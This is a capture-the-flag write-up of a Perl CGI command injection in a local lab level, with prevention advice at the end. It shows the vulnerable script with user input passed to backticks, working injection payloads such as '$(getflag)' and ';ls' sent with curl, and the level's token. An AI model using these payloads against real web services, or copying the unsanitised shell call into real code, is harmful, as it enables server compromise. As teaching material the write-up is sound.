# Level 04 - CGI Command Injection

## 🎯 Objective
Exploit a web CGI script to execute commands as `flag04`.

## 🧠 My Thought Process

### Step 1: "A Perl CGI script on a web server"
```bash
ls -la
# -rwsr-sr-x 1 flag04 level04 152 level04.pl

cat level04.pl
```

```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;   # ← VULNERABLE LINE!
}
x(param("x"));
```

### Step 2: "Analyzing the vulnerability"
The dangerous line is:
```perl
print `echo $y 2>&1`;
```

**What happens here:**
1. `param("x")` gets the URL parameter `x`
2. It's passed directly to the shell via backticks (`` ` ``)
3. No sanitization or escaping!

**The backticks in Perl execute shell commands**, just like `$()` in bash.

### Step 3: "Understanding the attack surface"
The script runs on port 4747. If I visit:
```
http://localhost:4747/level04.pl?x=hello
```

The server executes:
```bash
echo hello 2>&1
```

**But what if I inject shell commands?**

### Step 4: "Crafting the payload"
I need to inject a command. Options:
- `;getflag` → `echo ;getflag` (runs getflag after echo)
- `$(getflag)` → `echo $(getflag)` (command substitution)
- `` `getflag` `` → `echo `getflag`` (nested backticks)

I chose `$(getflag)` for clarity:

```bash
curl 'http://localhost:4747/level04.pl?x=$(getflag)'
```

### Step 5: "Why it works"
When the server processes this:
```perl
$y = "$(getflag)";
print `echo $(getflag) 2>&1`;
```

The shell expands `$(getflag)`:
1. Runs `getflag` → Returns the token
2. Substitutes the output into the echo command
3. Echo prints the token!

## ✅ Solution
```bash
curl 'http://localhost:4747/level04.pl?x=$(getflag)'
```

**Token:** `ne2searoevaevoem4ov4ar8ap`

## 📚 Concepts to Learn

### 1. CGI (Common Gateway Interface)
CGI is an old protocol for running server-side scripts:
- Browser sends request → Web server → CGI script
- Script generates HTML → Web server → Browser

**CGI scripts often run with the web server's privileges**, making them attractive targets.

### 2. Command Injection
**Command injection** occurs when user input is passed to a shell without proper sanitization.

| Input | Resulting Command | Effect |
|-------|-------------------|--------|
| `hello` | `echo hello` | Normal |
| `;ls` | `echo ;ls` | Lists directory |
| `$(whoami)` | `echo $(whoami)` | Shows username |
| `` `id` `` | `` echo `id` `` | Shows user ID |

### 3. Dangerous Perl Constructs
```perl
# DANGEROUS - shell execution
`command $user_input`          # Backticks
system("command $user_input")  # system()
open(FH, "|command $input")    # Pipe open
exec("command $user_input")    # exec()

# SAFER alternatives
system("command", $user_input)  # List form (no shell)
open(FH, "|-", "command")       # Three-arg open
```

### 4. URL Encoding
Special characters must be encoded in URLs:
| Character | Encoded |
|-----------|---------|
| Space | `%20` or `+` |
| `$` | `%24` |
| `` ` `` | `%60` |
| `;` | `%3B` |

The shell still interprets these after the web server decodes them!

### 5. The Execution Flow
```
1. Attacker crafts malicious URL
   ↓
2. Web server receives request
   ↓
3. CGI script starts with flag04's SUID privileges
   ↓
4. User input goes into backticks
   ↓
5. Shell executes malicious command
   ↓
6. getflag runs as flag04!
```

## 🔧 Tools Used
- `curl` - Command-line HTTP client
- `cat` - Read script contents
- Web browser (alternative to curl)

## 🛡️ How to Prevent This
1. **Never pass user input to shell commands**
2. **Use parameterized commands:**
   ```perl
   # Instead of: system("echo $input")
   # Use: system("echo", $input)  # No shell interpretation
   ```
3. **Whitelist valid input** - Reject anything unexpected
4. **Escape special characters** - Use `quotemeta()` in Perl
5. **Use modern frameworks** - They handle escaping automatically
6. **Run CGI with minimal privileges** - Don't use SUID unless necessary
